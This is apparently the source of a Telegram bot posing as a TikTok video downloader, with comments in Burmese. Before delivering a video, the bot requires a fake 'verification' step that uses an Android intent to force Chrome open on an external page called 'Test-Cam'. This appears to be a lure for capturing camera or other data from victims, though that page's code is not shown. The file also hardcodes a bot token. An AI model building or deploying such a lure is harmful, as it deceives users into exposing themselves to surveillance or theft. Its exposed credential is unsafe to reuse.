import telebot
import requests
from telebot import types

BOT_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY"
WEB_APP_URL = "https://tar-alt.github.io/Test-Cam/" 

bot = telebot.TeleBot(BOT_TOKEN)
user_links = {}

@bot.message_handler(commands=['start'])
def start(message):
    # Verification အောင်မြင်ပြီး ပြန်လာတဲ့အခါ
    if "Verification_Success" in message.text:
        link = user_links.get(message.chat.id)
        if link:
            msg = bot.send_message(message.chat.id, "✅ Verification အောင်မြင်ပါသည်။ ဗီဒီယို ပို့ပေးနေပါပြီ...")
            try:
                res = requests.get(f"https://www.tikwm.com/api/?url={link}&hd=1").json()
                if res['code'] == 0:
                    video_url = res['data'].get('hdplay') or res['data'].get('play')
                    bot.send_video(message.chat.id, video_url, caption="✅ *Download Successful!*")
                else:
                    bot.send_message(message.chat.id, "❌ ဗီဒီယို ဒေါင်းလုဒ်ဆွဲ၍ မရပါ။")
            except:
                bot.send_message(message.chat.id, "⚠️ စနစ်ချို့ယွင်းချက် ရှိနေပါသည်။")
        else:
            bot.send_message(message.chat.id, "❌ Link မရှိတော့ပါ။ ကျေးဇူးပြု၍ ပြန်ပို့ပေးပါ။")
    else:
        bot.send_message(message.chat.id, "🌟 *Ultra HD TikTok Downloader*\n\nTikTok Link ပို့ပေးပါ။", parse_mode="Markdown")

# bot.py ထဲက handle_link function ထဲမှာ ပြင်ပါ
@bot.message_handler(func=lambda message: "tiktok.com" in message.text)
def handle_link(message):
    user_links[message.chat.id] = message.text
    
    # Chrome နဲ့ တိုက်ရိုက်ပွင့်စေမည့် Intent Link (Android အတွက်)
    chrome_intent = f"intent://tar-alt.github.io/Test-Cam/#Intent;scheme=https;package=com.android.chrome;end"
    
    markup = types.InlineKeyboardMarkup()
    # ဒီနေရာမှာ url ကို chrome_intent နဲ့ ချိတ်ပေးလိုက်ပါ
    verify_btn = types.InlineKeyboardButton(text="ဗီဒီယိုဒေါင်းရန် Verification လုပ်ပါ 🔓", url=chrome_intent)
    markup.add(verify_btn)
    
    bot.send_message(message.chat.id, f"⚠️ *Verification Required*\n\nလူဟုတ်မဟုတ် အရင်စစ်ဆေးပေးပါ။\n\nLink: `{message.text}`", reply_markup=markup, parse_mode="Markdown")

bot.infinity_polling()

